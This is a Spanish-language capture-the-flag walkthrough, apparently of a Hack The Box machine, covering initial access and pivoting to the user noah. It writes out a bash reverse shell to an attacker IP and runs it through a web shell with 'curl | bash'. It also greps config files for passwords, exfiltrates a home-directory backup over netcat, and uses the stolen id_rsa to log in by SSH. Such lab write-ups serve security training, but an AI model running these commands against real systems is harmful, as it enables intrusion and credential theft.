## Explotacion de vulnerabilidad & Ganando Acceso {-}

### Crear una reverse shell desde la s4vishell.php con un index.html {-}

1. Creamos un index.html

    ```bash
    #!/bin/bash

    bash -i >& /dev/tcp/10.10.14.8/443 0>&1
    ```

1. Compartimos un servicio http por el puerto 80

    ```bash
    python3 -m http.server 80
    ```

1. Desde la s4vishell

    ```php
    http://10.10.10.230/6a5sd4f6a5sd1f6as5dfa6sd51fa.php?cmd=curl 10.10.14.8|bash
    ```

Ya esta

```bash
whoami
#Output

www-data
```

### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset
-> xterm
export TERM=xterm
export SHELL=bash

stty -a

stty rows <rownb> columns <colnb>
```

### Investigamos la maquina {-}

```bash
ls -l
cd /home
ls -l
cd noah/
cat user.txt
```

Permission denied. Nos tenemos que pasar al usuario Noah

### User Pivoting al usuario noah {-}

#### Analizamos el systema {-}

```bash
id
sudo -l
cd /
find \-perm -4000 2>/dev/null
cat /etc/crontab
ls -l /var/spool/cron
```

No vemos nada. Tendremos que pasar por el sistema web

```bash
cd /var
find \-type f 2>/dev/null
find \-type f 2>/dev/null | grep "config"
find \-type f 2>/dev/null | grep "config" | xargs grep "password" 2>/dev/null
find \-type f 2>/dev/null | grep "config" | xargs grep -E "username|password|key|database" 2>/dev/null
find \-type f 2>/dev/null | grep "config" | xargs grep -E "username|password|key|database" 2>/dev/null | grep -v "debconf"
find \-type f 2>/dev/null | grep "config" | xargs grep -E "username|password|key|database" 2>/dev/null | grep -v -E "debconf|keyboard"
```

Tampoco vemos algo aqui.

```bash
cd /var
find \-type f 2>/dev/null | grep -v -E "lib|cache"
```

Aqui vemos algo que podria ser interesante.

```bash
cd /var/backups
ls -l
```

Vemos un `home.tar.gz` y tenemos derecho de visualizar

#### Nos enviamos el home.tar.gz {-}

1. En la maquina de atacante

    ```bash
    nc -nlvp 443 > home.tar.gz
    ```

1. En la maquina victima

    ```bash
    nc 10.10.14.8 443 < home.tar.gz
    ```

1. Hacemos un md5sum para ver la integridad de la data
1. Analizamos el fichero

    ```bash
    7z l home.tar.gz
    ```

Ya podemos ver que es un comprimido del directorio home del usuario Noah con authorized_key y una id_rsa del proprio usuario

### Conexion por ssh {-}

```bash
chmod 600 id_rsa
ssh -i id_rsa noah@10.10.10.230
```

Ya estamos a dentro y podemos ver la flag

